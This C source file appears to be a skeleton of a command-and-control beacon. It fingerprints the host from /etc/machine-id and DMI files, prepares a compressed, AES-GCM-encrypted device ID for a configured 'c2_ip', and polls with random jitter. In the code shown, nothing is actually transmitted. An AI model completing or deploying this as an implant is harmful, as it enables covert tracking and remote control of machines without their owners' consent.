#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <zlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

struct Config {
    struct in_addr c2_ip;
    int minimum_poll_seconds;
    int maximum_poll_seconds;
    int compression_level;
};

uint64_t get_device_id(){

	const char *paths[] = {
		"/etc/machine-id",
		"/sys/class/dmi/id/product_name",
		"/sys/class/dmi/id/sys_vendor",
		"/sys/class/dmi/id/product_uuid"
	};

	uint64_t id = UINT64_C(14695981039346656037);

	for (int i = 0; i < 4; i++) {

		FILE *file = fopen(paths[i], "r");
		if (file == NULL) {
			return 1;
		}

		int character;
		while ((character = fgetc(file)) != EOF) {
			if (character == '\n' || character == '\r') {
				continue;
			}
			id ^= (unsigned char)character;
			id *= UINT64_C(1099511628211);
		}
		fclose(file);

		id ^= 255;
		id *= UINT64_C(1099511628211);
	}

	return id;

}

int main() {

	struct Config configuration = {
		.minimum_poll_seconds = 1,
		.maximum_poll_seconds = 3,
		.compression_level = 6
	};

	uint64_t device_id = get_device_id();

	inet_pton(AF_INET, "192.168.67.20", &configuration.c2_ip);
	srand((int)time(NULL) ^ (int)getpid());

	char message[64];
	sprintf(message, "%016" PRIx64, device_id);
	uLong message_length = strlen(message);
	uLongf compressed_length = compressBound(message_length);
	unsigned char *compressed_data = malloc(compressed_length);
	
	compress2(compressed_data, &compressed_length, (const unsigned char *)message, message_length, configuration.compression_level);

	unsigned char encryption_key[32];
	unsigned char nonce[12];
	unsigned char authentication_tag[16];
	unsigned char *encrypted_data = malloc(compressed_length);
	RAND_bytes(encryption_key, sizeof(encryption_key));
	RAND_bytes(nonce, sizeof(nonce));
	EVP_CIPHER_CTX *encryption_context = EVP_CIPHER_CTX_new();
	int encrypted_length = 0;
	int final_length = 0;
	EVP_EncryptInit_ex(encryption_context, EVP_aes_256_gcm(), NULL, encryption_key, nonce);
	EVP_EncryptUpdate(encryption_context, encrypted_data, &encrypted_length, compressed_data, (int)compressed_length);
	EVP_EncryptFinal_ex(encryption_context, encrypted_data + encrypted_length, &final_length);
	encrypted_length += final_length;
	EVP_CIPHER_CTX_ctrl(encryption_context, EVP_CTRL_AEAD_GET_TAG, sizeof(authentication_tag), authentication_tag);
	EVP_CIPHER_CTX_free(encryption_context);




	unsigned char *decrypted_data = malloc(encrypted_length);
	EVP_CIPHER_CTX *decryption_context = EVP_CIPHER_CTX_new();
	int decrypted_length = 0;
	int final_decrypted_length = 0;
	EVP_DecryptInit_ex(decryption_context, EVP_aes_256_gcm(), NULL, encryption_key, nonce);
	EVP_DecryptUpdate(decryption_context, decrypted_data, &decrypted_length, encrypted_data, encrypted_length);
	EVP_CIPHER_CTX_ctrl(decryption_context, EVP_CTRL_AEAD_SET_TAG, sizeof(authentication_tag), authentication_tag);
	EVP_DecryptFinal_ex(decryption_context, decrypted_data + decrypted_length, &final_decrypted_length);
	EVP_CIPHER_CTX_free(decryption_context);
	decrypted_length += final_decrypted_length;


	unsigned char decompressed_data[64];
	uLongf decompressed_length = sizeof(decompressed_data) - 1;
	uncompress(decompressed_data, &decompressed_length, decrypted_data, (uLong)decrypted_length);

	for (int i = configuration.minimum_poll_seconds; i <= configuration.maximum_poll_seconds; i++) {

		int delay_before_next_poll = configuration.minimum_poll_seconds + (int)rand() % (configuration.maximum_poll_seconds - configuration.minimum_poll_seconds + 1);





		sleep(delay_before_next_poll);

	}

	free(compressed_data);
	free(encrypted_data);
	free(decrypted_data);

	return 0;
}

